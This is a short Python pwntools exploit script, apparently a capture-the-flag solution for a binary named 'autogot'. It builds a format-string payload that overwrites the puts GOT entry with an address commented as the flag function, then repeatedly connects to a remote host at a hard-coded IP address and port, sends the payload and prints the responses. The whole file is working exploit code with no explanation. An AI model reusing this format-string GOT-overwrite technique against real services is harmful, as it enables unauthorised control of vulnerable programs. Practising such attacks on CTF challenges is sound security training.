from pwn import *
import base64

# context.log_level = 'debug'

#x = remote("1.224.175.32", 9981)

e = ELF("./autogot")

while True:
	x = remote("1.224.175.32", 9981)
	# local 7, server : 5
	payload = fmtstr_payload(7, {
		e.got['puts'] : 0x08048841 # main 0x0804886c flag 0x08048841
		#e.got['printf'] : e.got['system']
	})

	#print(hex(e.got['puts']))


	#pause()
	x.recvuntil(">>")
	x.sendline(payload)
	print(x.recvline())
	print(x.recvline())
	x.close()
